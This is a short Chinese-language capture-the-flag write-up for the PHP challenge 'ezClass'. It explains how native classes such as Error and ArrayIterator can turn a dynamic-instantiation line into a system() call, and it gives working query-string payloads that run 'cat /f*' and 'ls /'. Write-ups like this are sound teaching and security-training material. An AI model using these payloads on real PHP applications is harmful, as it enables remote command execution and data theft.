# ezClass

> 分类：Web

## 题目描述
PHP 原生类利用题。代码为 `((new $a($aa))->$c())((new $b($bb))->$c());`，需要利用原生类构造任意字符串并结合 PHP 动态执行函数特性执行系统命令。

## 考察知识点
- PHP 原生类（Error、ArrayIterator）
- `getMessage()` 返回任意字符串
- PHP 动态执行函数特性

## 解法
`new Error("xxx")` 的 `getMessage()` 可返回任意字符串 `xxx`。

```php
$a = new Error("Z3r4y");
echo $a->getMessage(); // Z3r4y
```

因此 `(new Error("system"))->getMessage()` 返回 `system`，作为函数调用，`(new Error("cat /f*"))->getMessage()` 返回命令作为参数。

最终 payload：
```
?a=Error&aa=system&b=Error&bb=cat /f*&c=getMessage
```

等价于 `system("cat /f*")`。

另解（ArrayIterator 类）：
```
/?a=ArrayIterator&aa[]=system&c=current&b=ArrayIterator&bb[]=ls /
```

## 参考答案
（未给出，见截图）

## 来源
- 作者：Z3r4y（uuzeray） | https://blog.csdn.net/uuzeray/article/details/138274291
- 作者：HvAng | https://hvang10.github.io/2024/04/27/XYCTF2024wp/index.html
- 作者：J1rrY | https://j1rry-learn.github.io/posts/2024-xyctf-webmisc-wp/
